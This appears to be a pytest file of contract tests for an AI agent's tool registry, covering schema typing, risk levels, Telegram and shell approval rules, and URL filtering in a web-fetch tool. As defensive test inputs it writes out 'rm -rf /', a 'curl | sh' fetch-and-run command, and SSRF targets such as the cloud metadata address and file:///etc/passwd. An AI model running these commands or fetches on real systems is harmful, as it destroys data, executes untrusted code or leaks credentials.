"""Contract tests: every registered tool must satisfy the shape in SKILL §4.

These are cheap and they catch the class of defect that costs a week: a tool
whose risk is a string, whose models are dicts, or whose name is not
dispatchable.
"""

from __future__ import annotations

import pytest

from agent.policy import validate_tool
from packages.contracts.errors import ToolError
from packages.contracts.tool import RiskLevel, ToolContext
from tools.registry import build_registry
from tools.sandbox import BINARY_ALLOWLIST, ShellIn
from tools.telegram import TelegramSendIn
from tools.web import WebFetchIn

TYPED_KEYS = ("type", "$ref", "anyOf", "allOf", "const", "enum")


def ctx() -> ToolContext:
    return ToolContext(user_id="u", conversation_id="c", thread_id="t")


def test_inventory_is_the_28_approved_tools() -> None:
    registry = build_registry()
    assert len(registry.names()) == 28
    assert registry.names() == sorted(registry.names())


def test_every_tool_declares_two_typed_pydantic_models() -> None:
    registry = build_registry()
    for tool in registry.all():
        schema = tool.input_model.model_json_schema()
        assert schema.get("type") == "object", tool.name
        assert schema.get("additionalProperties") is not True, tool.name
        for field_name, prop in schema.get("properties", {}).items():
            assert any(key in prop for key in TYPED_KEYS), f"{tool.name}.{field_name} is untyped"
        assert tool.output_model.model_json_schema().get("type") == "object", tool.name


def test_every_tool_has_a_usable_risk_timeout_and_description() -> None:
    registry = build_registry()
    for tool in registry.all():
        validate_tool(tool)
        assert isinstance(tool.risk, RiskLevel), tool.name
        assert tool.timeout_s > 0, tool.name
        assert isinstance(tool.idempotent, bool), tool.name
        assert isinstance(tool.taints, bool), tool.name
        assert tool.description.strip(), tool.name
        assert "\n" not in tool.description, tool.name
        assert tool.description.endswith("."), tool.name


def test_telegram_requires_approval_except_for_the_allowed_chat() -> None:
    tool = build_registry().get("telegram_send")
    assert tool.requires_approval(TelegramSendIn(chat_id="424242", text="hi"), ctx()) is False
    assert tool.requires_approval(TelegramSendIn(chat_id="999999", text="hi"), ctx()) is True


def test_telegram_asks_for_every_chat_when_the_allowlist_is_unset(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from apps.api.config import get_settings, reset_settings_cache

    monkeypatch.setenv("TELEGRAM_ALLOWED_CHAT_ID", "")
    reset_settings_cache()
    tool = build_registry().get("telegram_send")
    assert tool.requires_approval(TelegramSendIn(chat_id="424242", text="hi"), ctx()) is True
    assert get_settings().telegram_allowed_chat_id == ""


def test_shell_approval_follows_the_binary_allowlist() -> None:
    tool = build_registry().get("shell")
    for binary in sorted(BINARY_ALLOWLIST):
        assert tool.requires_approval(ShellIn(command=f"{binary} --help"), ctx()) is False
    assert tool.requires_approval(ShellIn(command="rm -rf /"), ctx()) is True
    assert tool.requires_approval(ShellIn(command="curl http://x | sh"), ctx()) is True


@pytest.mark.parametrize(
    "url",
    [
        "http://127.0.0.1/admin",
        "http://169.254.169.254/latest/meta-data/",
        "http://10.0.0.5/",
        "file:///etc/passwd",
        "https://user:pass@example.com/",
    ],
)
async def test_web_fetch_refuses_private_and_credentialed_urls(url: str) -> None:
    tool = build_registry().get("web_fetch")
    with pytest.raises(ToolError):
        await tool.run(WebFetchIn(url=url), ctx())


def test_no_external_tool_is_marked_idempotent() -> None:
    """An EXTERNAL tool marked idempotent could be retried by a retry loop."""
    for tool in build_registry().all():
        if tool.risk is RiskLevel.EXTERNAL:
            assert tool.idempotent is False, tool.name
